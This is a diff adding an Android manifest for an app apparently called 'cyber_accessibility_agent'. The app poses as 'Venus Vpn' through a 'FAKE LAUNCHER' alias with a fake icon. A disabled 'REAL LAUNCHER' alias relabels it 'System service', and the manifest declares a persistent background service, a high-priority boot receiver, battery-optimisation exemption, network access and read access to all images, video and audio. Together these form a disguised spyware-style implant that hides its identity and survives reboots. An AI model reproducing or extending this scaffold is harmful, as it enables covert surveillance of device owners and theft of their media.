@@ -1,0 +1,104 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.example.cyber_accessibility_agent">
+
+    <!-- ================= PERMISSIONS ================= -->
+
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+
+    <!-- Android 13- -->
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32"/>
+
+    <!-- Android 13+ -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
+
+    <!-- ================= APPLICATION ================= -->
+
+    <application
+        android:name="${applicationName}"
+        android:label="Venus Vpn"
+        android:icon="@mipmap/ic_launcher_fake"
+        android:allowBackup="true"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.CyberAccessibilityAgent">
+
+        <!-- Flutter embedding -->
+        <meta-data
+            android:name="flutterEmbedding"
+            android:value="2"/>
+
+        <!-- ================= MAIN ACTIVITY ================= -->
+        <!-- NO launcher intent-filter -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:theme="@style/Theme.Transparent" />
+
+        <!-- ================= FAKE LAUNCHER ================= -->
+        <!-- Shown BEFORE first launch -->
+        <activity-alias
+            android:name=".FakeLauncher"
+            android:targetActivity=".MainActivity"
+            android:label="Venus Vpn"
+            android:icon="@mipmap/ic_launcher_fake"
+            android:enabled="true"
+            android:exported="true">
+
+            <intent-filter android:priority="100">
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <!-- ================= REAL LAUNCHER ================= -->
+        <!-- Used by system / notification header -->
+        <!-- Drawable icon avoids mipmap cache issues -->
+        <activity-alias
+            android:name=".RealLauncher"
+            android:targetActivity=".MainActivity"
+            android:label="System service"
+            android:icon="@drawable/ic_launcher"
+            android:enabled="false"
+            android:exported="true">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <!-- ================= FOREGROUND SERVICE ================= -->
+        <service
+            android:name=".AgentService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="dataSync"/>
+
+        <!-- ================= BOOT RECEIVER ================= -->
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:directBootAware="true">
+
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
